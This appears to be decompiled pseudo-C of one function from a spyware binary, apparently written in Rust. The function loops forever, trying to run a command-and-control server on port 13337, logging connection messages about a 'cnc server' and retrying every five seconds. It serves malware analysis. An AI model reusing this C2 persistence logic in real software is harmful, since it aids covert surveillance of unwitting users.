void spyware::run_server_loop()
{
    unsigned long long v0;  // [bp-0xb8]
    unsigned long long v1;  // [bp-0xb0]
    unsigned long long v2;  // [bp-0xa8]
    unsigned long long v3;  // [bp-0xa0]
    unsigned long long v4;  // [bp-0x98]
    unsigned long long v5;  // [bp-0x90]
    unsigned long long v6;  // [bp-0x88]
    unsigned long long v7;  // [bp-0x80]
    unsigned long long v8;  // [bp-0x78]
    char *v9;  // [bp-0x70], Other Possible Types: unsigned long long
    int v10;  // [bp-0x68]
    unsigned long long v11;  // [bp-0x68]
    void* v12;  // [bp-0x60]
    char *v13;  // [bp-0x50]
    unsigned long long v14;  // [bp-0x48]
    char *v15;  // [bp-0x40]
    unsigned long long v16;  // [bp-0x38]
    unsigned long long v17;  // [bp-0x30]
    unsigned long long v18;  // [bp-0x28]
    unsigned long long v19;  // [bp-0x20]
    unsigned long long v20;  // [bp-0x18]
    unsigned long long v21;  // [bp-0x10]
    unsigned long long v23;  // r15
    unsigned long long v24;  // r14
    unsigned long long v25;  // r13
    unsigned long long v26;  // r12
    unsigned long long v27;  // rbx
    unsigned long long v28;  // rax

    v21 = v23;
    v20 = v24;
    v19 = v25;
    v18 = v26;
    v17 = v27;
    while (true)
    {
        if (::0x4514b0::core::sync::atomic::atomic_load() < 4)
        {
            v28 = spyware::communication::server::run_server(13337);
            if (!v28)
                goto LABEL_451a60;
        }
        else
        {
            v7 = &g_4b92a0;
            v8 = 1;
            v9 = 8;
            *((uint128_t *)&v10) = 0;
            v1 = "spyware:Successfully connected to cnc server !Failed to connect to cnc server (), error: 127.0.0.1";
            v2 = 7;
            v3 = "spyware:Successfully connected to cnc server !Failed to connect to cnc server (), error: 127.0.0.1";
            v4 = 7;
            v5 = log::__private_api::loc(&g_4b9300);
            log::__private_api::log(&v7, 4, &v1);
            v28 = spyware::communication::server::run_server(13337);
            if (!v28)
                goto LABEL_451a60;
        }
        v6 = v28;
        if (::0x4514b0::core::sync::atomic::atomic_load())
        {
            v0 = 5;
            v13 = &v6;
            v14 = <std::io::error::Error as core::fmt::Display>::fmt;
            v15 = &v0;
            v16 = core::fmt::num::imp::<impl core::fmt::Display for u64>::fmt;
            v7 = &g_4b92b0;
            v8 = 3;
            v12 = 0;
            v9 = &v13;
            v11 = 2;
            v1 = "spyware:Successfully connected to cnc server !Failed to connect to cnc server (), error: 127.0.0.1";
            v2 = 7;
            v3 = "spyware:Successfully connected to cnc server !Failed to connect to cnc server (), error: 127.0.0.1";
            v4 = 7;
            v5 = log::__private_api::loc(&g_4b9318);
            log::__private_api::log(&v7, 1, &v1);
        }
        ::0x451200::core::ptr::drop_in_place<std::io::error::Error>(&v6);
LABEL_451a60:
        if (::0x4514b0::core::sync::atomic::atomic_load() >= 4)
        {
            v0 = 5;
            v13 = &v0;
            v14 = core::fmt::num::imp::<impl core::fmt::Display for u64>::fmt;
            v7 = &g_4b92e0;
            v8 = 2;
            v12 = 0;
            v9 = &v13;
            v11 = 1;
            v1 = "spyware:Successfully connected to cnc server !Failed to connect to cnc server (), error: 127.0.0.1";
            v2 = 7;
            v3 = "spyware:Successfully connected to cnc server !Failed to connect to cnc server (), error: 127.0.0.1";
            v4 = 7;
            v5 = log::__private_api::loc(&g_4b9330);
            log::__private_api::log(&v7, 4, &v1);
        }
        std::thread::sleep(5, 0);
    }
}
